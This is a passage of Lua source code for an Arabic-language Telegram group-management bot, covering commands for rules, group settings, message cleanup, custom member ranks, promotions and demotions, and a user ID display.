redis:del('fayomy:'..bot_id..'king'..v)
end
send(msg.chat_id_, msg.id_, 1, "☑┇تم مسح ردود المطور", 1, 'md')
end

if text:match("^المطورين$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local list = redis:smembers('fayomy:'..bot_id..'dev')
text = "👨🏿‍💻 ※ قائمه المطورين ✓  ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️※ لا يوجد مطورين  ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end


------------------------------------
if text:match("^ردود المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
local list = redis:smembers('fayomy:'..bot_id..'kingresudo')
text = "📑┇قائمه ردود المطور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
text = text.."<b>|"..k.."|</b>~⪼("..v..")\n"
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❕┇لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^ردود المدير$") and (is_owner(msg) or is_creatorbasic(msg)) then
local list = redis:smembers('fayomy:'..bot_id..'kingre'..msg.chat_id_..'')
text = "📑┇قائمه ردود المدير\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
text = text.."<b>|"..k.."|</b>~⪼("..v..")\n"
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❕┇لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end

if text:match("^كرر (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(كرر) (.*)$")}
send(msg.chat_id_, msg.id_, 1, txt[2], 1, 'html')
end  
if text:match("^وضع قوانين (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(وضع قوانين) (.*)$")}
database:set('fayomy:'..bot_id..'rules'..msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع القوانين للمجموعه", 1, 'md')
end
if text:match("^القوانين$") then
local rules = database:get('fayomy:'..bot_id..'rules'..msg.chat_id_)
if rules then
send(msg.chat_id_, msg.id_, 1, '⚜┇قوانين المجموعه هي\n'..rules, 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '⚜┇لم يتم حفظ قوانين للمجموعه', 1, 'md')
end
end  
if not database:get("group_edit:fayomy"..msg.chat_id_..bot_id) then
if (is_mod(msg) or is_creatorbasic(msg))   then
if text:match("^وضع اسم (.*)$")   then
local txt = {string.match(text, "^(وضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
end
if text:match("^وضع صوره")  then
database:set('fayomy:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '♻️ ※ قم بارسال صوره الان  ✓', 1, 'md')
end
if text:match("^مسح الصوره") then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🗑※ تم مسح الصوره  ✓', 1, 'md')
end
if text:match("^وضع وصف (.*)$")  then
local text = {string.match(text, "^(وضع وصف) (.*)$")}
bot.changeChannelAbout(msg.chat_id_,text[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع وصف للمجموعه", 1, 'md')
end
end
end
if database:get("group_edit:fayomy"..msg.chat_id_..bot_id) and  (is_creator(msg) or is_creatorbasic(msg)) then 
if text:match("^وضع اسم (.*)$")   then
local txt = {string.match(text, "^(وضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
end
if text:match("^وضع صوره")  then
database:set('fayomy:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '♻️ ※ قم بارسال صوره الان  ✓', 1, 'md')
end
if text:match("^مسح الصوره")  then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🗑※ تم مسح الصوره  ✓', 1, 'md')
end
if text:match("^وضع وصف (.*)$") then
local text = {string.match(text, "^(وضع وصف) (.*)$")}
bot.changeChannelAbout(msg.chat_id_,text[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع وصف للمجموعه", 1, 'md')
end  
end
if text:match("^الوقت$") and (is_mod(msg) or is_creatorbasic(msg)) then
local ex = database:ttl( 'fayomy:'..bot_id.."charge:"..msg.chat_id_)
if ex == -1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي` ☑', 1, 'md')
else
local d = math.floor(ex / day ) + 1
send(msg.chat_id_, msg.id_, 1, "❕┇عدد ايام وقت المجموعه {"..d.."} يوم", 1, 'md')
end
end  
if text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and (is_mod(msg) or is_creatorbasic(msg)) then
delete_msg(msg.chat_id_, {[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_, {[0] = msg.id_})
end
----------------------------------------------------------------------------------------------
if text:match('^تنظيف (%d+)$') and (is_owner(msg) or is_creatorbasic(msg)) then
local matches = {string.match(text, "^(تنظيف) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
pm = '❕┇لا تستطيع حذف اكثر من 100 رساله'
send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])}, delmsg, nil)
pm ='☑┇تم <b>{'..matches[2]..'}</b> من الرسائل\n🗑┇حذفها'
send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
else pm ='❕┇هناك خطاء'
send(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
----------------------------------------------------------------------------------------------
if (text and text == 'تفعيل الايدي بالصوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'id:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '📸 ※ بلفعل  الايدي بالصوره مفعل ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '📸 ※ تم تفعيل الايدي بالصوره ✓', 1, 'md')
database:del('fayomy:'..bot_id..'id:photo'..msg.chat_id_)
end
end
if (text and text == 'تعطيل الايدي بالصوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'id:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '📸 ※ بلفعل الايدي بالصوره معطل✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '📸 ※ تم تعطيل  الايدي بالصوره ✓', 1, 'md')
database:set('fayomy:'..bot_id..'id:photo'..msg.chat_id_,true)
end
end
if (text and text == 'تفعيل جلب صوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'get:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇جلب صوره بالفعل تم تفعيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل جلب صوره', 1, 'md')
database:del('fayomy:'..bot_id..'get:photo'..msg.chat_id_)
end
end
if (text and text == 'تعطيل جلب صوره') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'get:photo'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇جلب صوره بالفعل تم تعطيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل جلب صوره', 1, 'md')
database:set('fayomy:'..bot_id..'get:photo'..msg.chat_id_,true)
end
end
if  (text and text == 'تفعيل وضع المدفوع') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if database:sismember('fayomy:'..bot_id..'pro:groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇بالفعل تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
database:sadd('fayomy:'..bot_id..'pro:groups',msg.chat_id_)
end
end
if (text and text == 'تعطيل وضع المدفوع') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not database:sismember('fayomy:'..bot_id..'pro:groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇بالفعل تم حذف المجموعه من الوضع المدفوع', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف المجموعه من الوضع المدفوع', 1, 'md')
database:srem('fayomy:'..bot_id..'pro:groups',msg.chat_id_)
end
end
if (text and text == 'تفعيل الاذاعه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not database:get('fayomy:'..bot_id..'bc:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇الاذاعه بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل اذاعه البوت', 1, 'md')
database:del('fayomy:'..bot_id..'bc:groups')
end
end
if (text and text == 'تعطيل الاذاعه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if database:get('fayomy:'..bot_id..'bc:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇الاذاعه بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل اذاعه البوت', 1, 'md')
database:set('fayomy:'..bot_id..'bc:groups',true)
end
end
if (text and text == 'تفعيل المغادره') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if not database:get('fayomy:'..bot_id..'leave:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇مغادره بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل مغادره البوت', 1, 'md')
database:del('fayomy:'..bot_id..'leave:groups'..msg.chat_id_)
end
end
if (text and text == 'تعطيل المغادره') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if database:get('fayomy:'..bot_id..'leave:groups') then
send(msg.chat_id_, msg.id_, 1, '☑┇مغادره بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل مغادره البوت', 1, 'md')
database:set('fayomy:'..bot_id..'leave:groups'..msg.chat_id_,true)
end
end
if (text and text == "مسح صلاحيه" and is_creator(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
database:set("fmahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok")
return "Fayomy"
end  
if (text and database:get("fmahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف صلاحيه بنجاح', 1, 'md')
database:del("fayomy:all_if:"..text..bot_id..msg.chat_id_)
database:del("fmahke:is_del_if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
end 

----------------------------------------
if text:match("^تغير رد المطور (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المطور (.*)$")}
database:set("fayomy:name_sudo"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
-------------------------------------------
if text:match("^تغير رد المنشئ (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المنشئ (.*)$")}                     
database:set("fayomy:name_cre"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end

if text:match("^تغير رد منشئ الاساسي (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد منشئ الاساسي (.*)$")}                     
database:set("fayomy:name_cre"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
------------------------------------
if text:match("^تغير رد المدير (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد المدير(.*)$")}
database:set("fayomy:name_own"..bot_id..msg.chat_id_,ac[1]) 
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
------------------------------------
if text:match("^تغير رد الادمن (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد الادمن (.*)$")}
database:set("fayomy:name_adm"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
--------------------------------
if text:match("^تغير رد العضو المميز (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد العضو المميز (.*)$")}
database:set("fayomy:name_vipp"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
-------------------------------
if text:match("^تغير رد العضو فقط (.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
ac = {string.match(text, "^تغير رد العضو فقط (.*)$")}
database:set("fayomy:name_nk"..bot_id..msg.chat_id_,ac[1])
send(msg.chat_id_, msg.id_, 1, "تم تغير الرد الى --> "..ac[1], 1, 'md')
end
--------------------------------
if (text and text == "اضف صلاحيه" and (is_creator(msg) or is_creatorbasic(msg))) then 
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
database:set("fayomy:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "FMHAKE"
end
if text and database:get("fayomy:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
database:del("fayomy:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
database:set("fayomy:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
database:set("fayomy:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "FMHAKE"
end
if (text and database:get("fayomy:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
if (text == "ادمن" or text == "مدير" or text == "عضو مميز" or text == "لا شيئ") then 
database:del("fayomy:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
fmha_text = database:get("fayomy:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '☑️┇تم حفض الصلاحيه بنجاح \n⚠️┇الاوامر { رفع/تنزيل '..fmha_text..' }', 1, 'md')
database:set("fayomy:all_if:"..fmha_text..bot_id..msg.chat_id_,text)
database:del("fayomy:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
else 
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
end
end
if text then 
if text:match("^رفع (.*)$")  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
a = {string.match(text, "^رفع (.*)$")}
fm_text = database:get("fayomy:all_if:"..a[1]..bot_id..msg.chat_id_)
if fm_text then 
function promote_by_reply(extra, result, success)
if fm_text == "ادمن" then 
database:sadd('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
elseif fm_text == "عضو مميز" then 
database:sadd('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
elseif fm_text == "مدير" then 
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
end
database:set("fayomy:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_,a[1])
function king33332(extra,result2,success)
info = '💁🏻‍♂️※ العضو ✓['..result2.first_name_..'](t.me/'..(result2.username_ or 'FayomyTeam')..')\n☑┇تم رفعه '..a[1]
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(result.sender_user_id_, king33332)  
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
end
if text:match("^رفع (.*) @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^رفع (.*) @(.*)$")}
fm_text = database:get("fayomy:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if fm_text then 
function promote_by_username(extra, result, success)
if result.id_ then
if fm_text == "ادمن" then 
database:sadd('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.id_)
elseif fm_text == "عضو مميز" then 
database:sadd('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
elseif fm_text == "مدير" then 
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.id_)
end
database:set("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_,apmd[1])
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n☑┇تم رفعه '..apmd[1]
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
end
if text:match("^رفع (.*) (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^رفع (.*) (%d+)$")}
fm_text = database:get("fayomy:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if fm_text then 
if fm_text == "ادمن" then 
database:sadd('fayomy:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
elseif fm_text == "عضو مميز" then 
database:sadd('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif fm_text == "مدير" then 
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
database:set("fayomy:name_user:"..bot_id..msg.chat_id_..apmd[2],apmd[1])
fmX000(apmd[2],msg,"☑┇تم رفعه "..apmd[1])
end
end
if text:match("^تنزيل (.*)$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
a = {string.match(text, "^تنزيل (.*)$")}
fm_text = database:get("fayomy:all_if:"..a[1]..bot_id..msg.chat_id_)
if fm_text then 
function demote_by_reply(extra, result, success)
if fm_text == "ادمن" then 
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
elseif fm_text == "عضو مميز" then 
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
elseif fm_text == "مدير" then 
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
end
database:del("fayomy:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
fmX000("prore",msg,"☑┇ تم تنزيله من "..a[1])
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
end
if text:match("^تنزيل (.*) @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^تنزيل (.*) @(.*)$")}
fm_text = database:get("fayomy:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if fm_text then 
function demote_by_username(extra, result, success)
if result.id_ then
if fm_text == "ادمن" then 
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.id_)
elseif fm_text == "عضو مميز" then 
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
elseif fm_text == "مدير" then 
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.id_)
end
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n☑┇تم تنزيله من '..apmd[1]
database:del("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
end
if text:match("^تنزيل (.*) (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^تنزيل (.*) (%d+)$")}
fm_text = database:get("fayomy:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if fm_text then 
if fm_text == "ادمن" then 
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
elseif fm_text == "عضو مميز" then 
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
elseif fm_text == "مدير" then 
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
end
fmX000(apmd[2],msg,"☑┇ تم تنزيله من "..apmd[1])
database:del("fayomy:name_user:"..bot_id..msg.chat_id_..apmd[2])
end
end
end 
if (text and text == 'تفعيل ردود المطور') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المطور بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل ردود المطور', 1, 'md')
database:del('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_)
end
end
if  (text and text == 'تعطيل ردود المطور') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المطور بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, 'تم تعطيل ردود المطور', 1, 'md')
database:set('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
end
end
if (text and text == 'تفعيل ردود المدير') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المدير بالفعل تم تفعيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل ردود المدير', 1, 'md')
database:del('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل ردود المدير') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇ردود المدير بالفعل تم تعطيلها', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل ردود المدير', 1, 'md')
database:set('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_,true)
end
end
if text:match("^ايدي المجموعه$") then
send(msg.chat_id_, msg.id_, 1, "*"..msg.chat_id_.."*", 1, 'md')
end
if (text and text == 'تفعيل الايدي') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🔰 ※ الايدي بالفعل تم تفعيله ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🔰 ※ الايدي  تم تفعيله ✓', 1, 'md')
database:del('fayomy:'..bot_id..'id:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل الايدي') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🔰 ※ تم تعطيل الايدي بالفعل  ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🔰 ※ تم تعطيل الايدي  ✓', 1, 'md')
database:set('fayomy:'..bot_id..'id:mute'..msg.chat_id_,true)
end
end
if (text and text == "تعطيل الرابط" and is_owner(msg)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل امر الروابط', 1, 'md')
database:set("fayomy:mute:link:gr:"..bot_id..msg.chat_id_,"ok")
end
if (text and text == "تفعيل الرابط" and is_owner(msg)) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل امر الروابط', 1, 'md')
database:del("fayomy:mute:link:gr:"..bot_id..msg.chat_id_)
end
if text and text == "تعين مجموعه المطور" and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين ~⪼ `'..msg.chat_id_..'`', 1, 'md')
database:set("fayomy"..bot_id..":sudo:gr",msg.chat_id_)
end
if text and text == "مسح مجموعه المطور" and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇ تم مسح مجموعه المطور', 1, 'md')
database:del("fayomy"..bot_id..":sudo:gr")
end
if (text:match("^ايدي$") or text:match("^id$") ) and msg.reply_to_message_id_ == 0 then
if not database:sismember('fayomy:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
      database:sadd('fayomy:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')
local king_info = nil
function king333(extra,result,success)
king_info = '@'..(result.username_ or 'لا يوجد')..''
local function getpro(extra, result, success)
local all_photo_fayomy = result.total_count_ 
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if tonumber((database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))
end
local user_msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local iking_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
iking_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
iking_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
iking_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
iking_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
iking_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
iking_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
iking_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
iking_text = "متفاعل كلش"
end
king = database:smembers('king:all:pppp:tt:'..bot_id) or 0
if (king or king[1] and end032) then 
for i=1, #king do
local tttee = database:get("king:set:text:p"..bot_id..king[i])
if tonumber(user_msgs) >= tonumber(king[i]) then 
iking_text = tttee
end
end
end
end
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
if result.photos_[0] then
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t =  database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t =  database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'   
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'  
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'id:photo'..msg.chat_id_) then
if not database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_) then 
local king_text = {
'صورتك فدشي 😘😔❤️  ',
"صارلك شكد مخليه 😐",
"وفالله 😔💘",
"كشخه برب 😉💘",
"دغيره شبي هذ 😒",
"عمري الحلوين 🙈💘",
}
king3 = math.random(#king_text)
